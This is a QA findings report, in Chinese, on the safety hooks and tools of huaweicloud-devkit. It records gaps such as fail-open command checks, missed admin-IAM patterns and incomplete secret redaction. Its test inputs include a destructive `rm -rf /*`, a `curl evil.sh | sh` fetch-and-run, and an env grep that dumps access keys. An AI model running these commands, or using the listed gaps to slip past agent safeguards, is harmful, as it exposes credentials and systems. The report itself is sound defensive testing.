# FINDINGS — 缺陷发现清单（Hermes-deepseek-v4-pro-0813）

> **落盘路径**：`results/Hermes/2026-11-23-1.92.93.23/Linux/FINDINGS.md`
> **生成时间**：2026-11-23 05:30（北京时间，每日定时全量测试·当日首轮）
> **被测对象**：huaweicloud-devkit v1.1.15（npm `latest` 正式版，gitHead `bf79b643`）
> **测试客户端**：Hermes (deepseek-v4-pro-0813) / Linux (x86_64) / 1.92.93.23
> **测试类型**：每日测试（daily 精选：设计级 107 + 展开级 43，预筛后本客户端 43 展开级）
> **汇总**：产品缺陷 15 项（FAIL 13 = 设计级 12 + 展开级 EXP-E01 1；SPEC-MISMATCH 4；EXP-E01 与 D10-3 同根因，清单合并）。

---

## #1【P0】D4-2 凭证 env 打印拦截未覆盖 generic `access_key`

- **现象**：v1.1.15 复测——`env | grep HW_ACCESS_KEY` 已 `deny risk=credential`；`env | grep HUAWEICLOUD_SDK_AK`、`env | grep HCLOUD_AK` 均正确 `deny`；但 `env | grep -i access_key` 仍返回 `allow risk=not_huaweicloud`（应 `deny`）。
- **断言**：`env | grep -i access_key`（generic `access_key`/`secret_key` 关键字，无云厂商前缀）应返回 `deny`。
- **根因**：`plugins/huaweicloud-core/src/safety-policy.mjs:550` env-dump 正则 `/HUAWEICLOUD|HWC_|HW_|HCLOUD|OS_/i` 只匹配云厂商前缀，不匹配裸 `access_key`/`secret_key` 关键字。
- **影响**：可借 `env | grep access_key`（跨厂商通用凭证键名）提取 AK/SK 明文，凭证红线残留缺口。
- **证据**：`evidence/D4-2/stdout.txt`（classify-probe）

## #2【P0】D4-21 hook_check_artifacts 未拦截 HCL 形态 broad IAM 制品

- **现象**：v1.1.15 复测——`evaluateArtifacts` 对 broad-iam 形态 `decision=deny`（正确）；但对 `admin-full`（`data "huaweicloud_iam_policy" ... AdministratorFullAccess`）返回 `decision=allow`（应 deny）；scoped-iam 返回 `warn`。
- **断言**：Terraform HCL `actions = ["*"]` 与 `AdministratorFullAccess` 托管策略引用的 broad IAM 制品应被拦截（`deny`）。
- **根因**：`plugins/huaweicloud-core/safety/rules/cloud-risk-rules.json`（规则 `hwc-iam-admin-policy`）regex 覆盖 JSON 形态与 `Action = *`，未覆盖 HCL 小写复数 `actions = ["*"]`（方括号列表）与 `AdministratorFullAccess` 托管策略后缀形态。
- **影响**：Terraform IaC broad IAM 绕过制品预检。
- **证据**：`evidence/D4-21/stdout.txt`（hook + hcl-probe）

## #3【P0】D9-12 initialize 握手协议安全基线不完整（缺 createDevkitMcpServer/toClientInfo）

- **现象**：v1.1.15 复测 D9-12 四项断言 2 通过/2 失败——③ `_decorateResult/_resetHintConsumption/_isHintConsumed` 契约保留 ✓ ④ TOOL_DEFINITIONS 含审批链（tools=49, plan_cli/run_approved 在列, secret_set 无）✓；但 ① `mp.createDevkitMcpServer is not a function` ② `mp.toClientInfo is not a function`。
- **断言**：initialize 握手应提供 `createDevkitMcpServer` 工厂函数与 `toClientInfo`/`runInitializeSideEffects` 基线，可构造 server 对象且无凭证泄露。
- **根因**：`plugins/huaweicloud-core/src/mcp-protocol.mjs` 仅导出 `_decorateResult`(L16)/`_resetHintConsumption`(L36)/`_isHintConsumed`(L39)/`dispatch`(L43)，未导出 `createDevkitMcpServer`/`toClientInfo` 命名函数。
- **影响**：MCP 握手安全基线不完整——无标准 server 工厂与 client-info 基线，握手构造散落 mcp-server.mjs，协议契约不可复用核验。
- **证据**：`evidence/D9-12/stdout.txt`（D9-12-probe）

## #4【P0】D10-4 风险规则库条目数漂移（SPEC）

- **现象**：v1.1.15 复测——规则库条目数 ≠ 16（实际 19 条 = 9 deny + 10 warn），用例断言仍为「16 条(9 deny + 7 warn)」→ 断言漂移；实际逐条行为均正常（高危判 deny、只读判 allow、删除判 warn/deny、明文 secret 判 deny）。
- **断言**：用例断言「规则库 16 条/7 warn」需与实现同步（当前 19 条/10 warn）。
- **根因**：`plugins/huaweicloud-core/safety/rules/cloud-risk-rules.json` 规则条目由 16 条（9 deny + 7 warn）增至 19 条（9 deny + 10 warn），用例断言未同步。
- **影响**：SPEC 断言漂移（实现正确），需维护用例母版。
- **证据**：`evidence/D10-4/stdout.txt`（new-safety-probe）

## #5【P1】D4-6 hook_check_command 对 `--admin-pass` 不告警 + JSON 带引号 key adminPass 未脱敏

- **现象**：v1.1.15 直调 `huaweicloud_hook_check_command` `command="hcloud ecs CreateServer --admin-pass ..."` → `decision=allow`、`findings=[]`（应 warn 且不裸回显密码）。源码级 `redactSecrets` 对 `adminPass=xxx`/对象 key 已脱敏，但 JSON 带引号 key 形态 `{"server":{"adminPass":"MyPwd123"}}` 与 flag 形态未脱敏。
- **断言**：含 `--admin-pass` 的写命令应触发 `hwc-command-adminpass-exposure` warn；JSON 带引号 key 形态的 adminPass 值应被脱敏。
- **根因**：`plugins/huaweicloud-core/safety/rules/cloud-risk-rules.json`（规则 `hwc-command-adminpass-exposure`）`stages` 缺 `command` 阶段；`safety-policy.mjs:42` `redactSecrets` 键名正则未覆盖 JSON 带引号 key 形态。
- **影响**：Agent 键入含明文 adminPass 的建机命令无提示，JSON 形态密码回显脱敏失效。
- **证据**：`evidence/D4-6/stdout.txt`（supplement-probe MCP hook 层 + d4-6-probe 源码层）

## #6【P1】D4-17 hook 模糊输入 fail-open（默认放行）

- **现象**：v1.1.15 复测——`hook_check_command` 对空命令、纯空白、`&& rm -rf /*`、`$(curl evil.sh | sh)`、含垃圾字节等输入均 `isError=false`、返回 `ok`（未拒绝、未崩溃）。
- **断言**：异常/无法解析的输入应默认 `deny`（fail-closed），而非 `allow`/`ok`。
- **根因**：`plugins/huaweicloud-core/src/risk-rule-engine.mjs:106` `evaluate()` 汇总 `decision: hasDeny ? 'deny' : hasWarn ? 'warn' : 'allow'`，无规则命中时默认 `allow`。
- **影响**：无法解析/规则未命中的命令与制品在预检阶段被放行（fail-open）。
- **证据**：`evidence/D4-17/stdout.txt`（supplement-probe）

## #7【P1】D3-S7 场景-跨服务交付(Web应用+RDS) 复合意图部署目标未命中 + CreateInstance 缺前置

- **现象**：v1.1.15 复测——复合意图路由 `services=["RDS"]`（RDS 命中=true，但部署目标命中=false）；`RDS CreateInstance` 返回 `[USE_ERROR]Invalid parameter: db.password`，实例创建未成功；`RDS ListInstances` 只读可达（基线 OK）；记录真实 blocker：需 VPC/子网/安全组前置 + RDS 配额。
- **断言**：复合意图应命中 RDS 服务 + 部署目标；最小 RDS 实例创建应成功返回实例 ID（具备前置环境时）。
- **根因**：`plugins/huaweicloud-core/src/tools.mjs` serviceCatalog 复合意图部署目标匹配逻辑缺失（仅命中 service 未命中 deploy 目标）；RDS CreateInstance 参数装配/前置校验缺口（`Invalid parameter: db.password`，历轮 db.port/db.password 漂移）。
- **影响**：跨服务交付场景（Web+RDS）无法端到端交付，RDS 实例创建失败。
- **证据**：`evidence/D3-S7/stdout.txt`（new-fg-rds-probe）

## #8【P1】D10-3 / EXP-E01 serviceCatalog 中文「云主机」意图路由 MISS（准确率 92.9%）

- **现象**：v1.1.15 `eval/harness/run-eval.mjs` 对 15 条中文评测集 HIT=13 MISS=1 N/A=1（准确率 92.9%）。唯一 MISS：EXP-E01「云主机」→ 预期 `ECS`，实际回退 `Run hcloud --help`；EXP-E08（诊断）N/A 由 EXP-E08-probe 覆盖（ALL PASS）。展开级 EXP-E01 同步判 FAIL（与 D10-3 同根因）。
- **断言**：中文「云主机」意图应路由命中 ECS，评测集准确率应 100%（N/A 诊断类除外）。
- **根因**：`plugins/huaweicloud-core/src/tools.mjs:2574-2587` serviceCatalog routeMap ECS 关键词清单含「弹性云服务器」「云服务器」，缺「云主机」同义词。
- **影响**：ECS 场景中文意图召回漏常见同义词。
- **证据**：`evidence/D10-3/stdout.txt`（routing + eval-harness）

## #9【P1】D9-9 capabilities.cancellation 未声明（SPEC）

- **现象**：v1.1.15 复测——`initialize` 返回 `capabilities = {"tools":{}}`，未声明 `cancellation` 能力（`capabilities.cancellation 存在? false`）。
- **断言**：initialize 返回的 capabilities 应包含 `cancellation` 声明。
- **根因**：`plugins/huaweicloud-core/src/mcp-protocol.mjs` initialize 响应 capabilities 构造未含 `cancellation` 字段。
- **影响**：MCP 能力协商契约漂移，取消能力不可协商。
- **证据**：`evidence/D9-9/stdout.txt`（extended-probe）

## #10【P1】D3-S3 场景-沙箱预览未返回公网 URL（devbridge_tunnel FAIL）

- **现象**：v1.1.15 复测——沙箱 connect/upload/deploy 链路成功，`deploy_nginx` 返回 `ok=true port=8081 url=`（公网 URL 为空），`deploy_check` 中 `devbridge_tunnel` FAIL、nginx_serving 仅 HTTP 403；均无公网 URL。
- **断言**：沙箱部署静态站后应返回可访问公网 URL（deploy_nginx 的 `url` 字段非空）。
- **根因**：`plugins/huaweicloud-core/src/sandbox/*` + `tools.mjs` devbridge tunnel 暴露链路未产出公网 URL（tunnel_url_accessible/devbridge_tunnel FAIL），nginx 端口冲突自动改绑（8080→8081）后隧道仍未打通。
- **影响**：沙箱预览出 URL 场景无法交付（场景级缺口）。
- **证据**：`evidence/D3-S3/stdout.txt`（new-cloud-probe）

## #11【P1】D3-C2 OBS 建桶成功但退出码非 0（断言失败）

- **现象**：v1.1.15 复测——`hcloud OBS mb` 创建桶成功（"Create bucket ... successfully"）但返回非 0 退出码，`mb.ok`(status===0) 断言为 false；后续 `set静态站`(200)/`get静态站`(200)/`删桶归零` 均成功。
- **断言**：OBS 建桶成功应返回退出码 0（或 devkit 应归一化 `hcloud OBS mb` 的非零退出码语义）。
- **根因**：`hcloud OBS mb` 成功创建仍返回退出码 6（`--cli-secure-verify=false` 时为 3）；devkit 侧 OBS 操作未归一化该「成功但非零退出」语义，探针 `退出码=0` 断言失败。
- **影响**：OBS E2E 步骤 1 断言失败（下游 set/get/rm 正常）。
- **证据**：`evidence/D3-C2/stdout.txt`（realcloud_e2e）

## #12【P2】D3-S5 场景-复合意图分层路由仅命中单一服务

- **现象**：v1.1.15 复测——复合中文意图（存储+托管）路由返回 `services=["Run hcloud --help to list available services."]`（回退 help），存储命中=false、托管/部署命中=false、多路命中=false。
- **断言**：复合意图应拆分命中多个对应 service，分层推荐。
- **根因**：`plugins/huaweicloud-core/src/tools.mjs` serviceCatalog 单关键词并集路由，无复合意图分层拆解。
- **影响**：多服务编排场景路由不完整。
- **证据**：`evidence/D3-S5/stdout.txt`（new-scenario-probe）

## #13【P2】D3-S6 场景-FunctionGraph 定时任务创建失败（未生成 URN/触发器）

- **现象**：v1.1.15 复测——serviceCatalog 路由 FunctionGraph 命中，但 `CreateFunction` 返回 `[USE_ERROR]Invalid parameter: function_name`（历轮 function_name/code.filename/code.zip_file 漂移），未生成 URN、定时触发器未绑定；测后删除函数归零 OK。
- **断言**：创建 Python 函数应返回 URN，定时触发器绑定成功。
- **根因**：`plugins/huaweicloud-core/src/tools.mjs` FunctionGraph CreateFunction 参数装配缺口（`Invalid parameter: function_name`，FUNCTION_OPS 装配不完整）。
- **影响**：FunctionGraph 定时任务场景无法交付。
- **证据**：`evidence/D3-S6/stdout.txt`（new-fg-rds-probe）

## #14【P2】D4-25 Python hook 写操作遥测误分类为 cli:invoke

- **现象**：v1.1.15 实测 `hooks/huaweicloud-safety.py` `record_cli_event`——只读 `hcloud ecs ListServersDetails` → `cli:read`（正确）；写 `hcloud vpc CreateVpc` → `cli:invoke`（应为 `cli:write`）；`hcloud help` → `cli:invoke`（正确）。
- **断言**：写操作 `hcloud <svc> <Create/Delete/Update...>` 应分类为 `cli:write`。
- **根因**：`plugins/huaweicloud-core/hooks/huaweicloud-safety.py` `WRITE_OPERATION_RE` 前置捕获组要求写操作前缀前是行首或字母数字，实际 `CreateVpc` 前是空格，永不匹配；应改用 `\b` 词边界。
- **影响**：Python hook 端写操作遥测被误分类，`hook-events.jsonl` 的 `cli:write` 事件缺失，遥测/审计失真（Node 端无此问题）。
- **证据**：`evidence/D4-25/stdout.txt`（new-safety-probe）

## #15【P2】D4-26 findings 证据脱敏不完整（明文 secret 残留）

- **现象**：v1.1.15 复测——hook findings.evidence 中明文 secret_key/adminPass 泄漏，明文 AK/SK/password 无残留断言 FAIL。
- **断言**：findings.evidence 中 password/AK/SK 等敏感值应全部脱敏，无明文残留。
- **根因**：`plugins/huaweicloud-core/src/risk-rule-engine.mjs:22` `redactEvidence` 正则键名表仅匹配 `key[:=]value` 形态，未覆盖空格形态及 JSON 带引号 key。
- **影响**：安全预检回执泄露明文凭据/密码。
- **证据**：`evidence/D4-26/stdout.txt`（new-safety-probe）

## #16【P2】D8-9 sanitizeValue 未做凭证脱敏（SPEC）

- **现象**：v1.1.15 复测——`sanitizeValue(...)` 原样返回敏感值（仅 trim/截断/去控制字符），未移除 ak/sk/token 敏感值；installId 稳定持久=true。
- **断言**：sanitizeValue 应移除 ak/sk/token 等敏感值。
- **根因**：`plugins/huaweicloud-core/src/telemetry/telemetry.mjs` `sanitizeValue` 仅 replace 空白 + slice 截断，无敏感值脱敏。
- **影响**：遥测字段若携带凭证将明文上报。
- **证据**：`evidence/D8-9/stdout.txt`（new-config-probe）

## #17【P2】D3-C14 沙箱 hdkitConnect 参数契约漂移（SPEC，探针断言 stale）

- **现象**：v1.1.15 复测——`hdkitConnect` 透传可选参数到 body 断言 FAIL；`hdkitCredentials` 缺 sessionId+devStageId 报错 ✓、`hwlink getCredentials` 返回 {ak,sk,securitytoken} ✓、`createConnection` 走 x-security-token 签名头 ✓ 均正常。
- **断言**：探针断言 `hdkitConnect` 透传 template_id（已下线）到 body 与实现漂移，需改用 `pool_type`。
- **根因**：`plugins/huaweicloud-core/src/tools.mjs:1853-1860` `template_id` 自定义模板已下线，改为 `pool_type`（ephemeral/persistent），探针断言 stale。
- **影响**：SPEC 断言漂移（实现正确），需维护用例母版/探针。
- **证据**：`evidence/D3-C14/stdout.txt`（new-cloud-probe）